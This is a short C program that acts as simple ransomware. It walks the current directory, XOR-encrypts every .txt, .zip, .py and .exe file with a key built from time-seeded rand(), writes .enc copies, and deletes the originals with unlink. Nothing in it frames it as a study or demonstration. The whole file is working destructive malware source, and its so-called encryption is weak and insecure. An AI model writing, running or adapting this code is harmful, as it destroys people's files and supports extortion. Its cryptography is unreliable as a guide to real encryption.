#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <time.h>
#include <unistd.h>

#define KEY_LEN 32

void encrypt_file(const char* path, const unsigned char* key_bytes);
void generate_key(unsigned char* key_bytes);

int main(int argc, char* argv[]) {
    // Seed the random number generator
    srand(time(NULL));

    // Generate the key
    unsigned char key_bytes[KEY_LEN];
    generate_key(key_bytes);

    // Save the key to a file
    FILE* key_file = fopen("key.bin", "wb");
    fwrite(key_bytes, 1, KEY_LEN, key_file);
    fclose(key_file);

    // Find and encrypt all txt, zip, py, and exe files in the current directory
    DIR* dir;
    struct dirent* ent;
    if ((dir = opendir(".")) != NULL) {
        while ((ent = readdir(dir)) != NULL) {
            if (ent->d_type == DT_REG && (strstr(ent->d_name, ".txt") != NULL || strstr(ent->d_name, ".zip") != NULL || strstr(ent->d_name, ".py") != NULL || strstr(ent->d_name, ".exe") != NULL)) {
                printf("Found file: %s\n", ent->d_name);
                char path[PATH_MAX];
                sprintf(path, "./%s", ent->d_name);
                printf("Encrypting file: %s\n", path);
                encrypt_file(path, key_bytes);
                printf("Encrypted file: %s.enc\n", path);
                printf("Deleting file: %s\n", path);
                unlink(path);
            } else if (strcmp(ent->d_name, "key.bin") == 0) {
                printf("Skipping key file: %s\n", ent->d_name);
            }
        }
        closedir(dir);
    } else {
        perror("Could not open directory");
        return EXIT_FAILURE;
    }

    return EXIT_SUCCESS;
}

void encrypt_file(const char* path, const unsigned char* key_bytes) {
    FILE* in_file = fopen(path, "rb");
    fseek(in_file, 0, SEEK_END);
    long plaintext_len = ftell(in_file);
    rewind(in_file);

    unsigned char* plaintext = malloc(plaintext_len);
    fread(plaintext, 1, plaintext_len, in_file);
    fclose(in_file);

    unsigned char iv[KEY_LEN];
    for (int i = 0; i < KEY_LEN; i++) {
        iv[i] = rand() % 256;
    }

    unsigned char ciphertext[plaintext_len];
    for (int i = 0; i < plaintext_len; i++) {
        ciphertext[i] = plaintext[i] ^ key_bytes[i % KEY_LEN] ^ iv[i % KEY_LEN];
    }

    // Change the file extension to .enc for the encrypted file
    char enc_path[PATH_MAX];
    sprintf(enc_path, "%s.enc", path);

    FILE* out_file = fopen(enc_path, "wb");
    fwrite(iv, 1, KEY_LEN, out_file);
    fwrite(ciphertext, 1, plaintext_len, out_file);
    fclose(out_file);

    free(plaintext);
}


void generate_key(unsigned char* key_bytes) {
    for (int i = 0; i < KEY_LEN; i++) {
        key_bytes[i] = rand() % 256;
    }
}
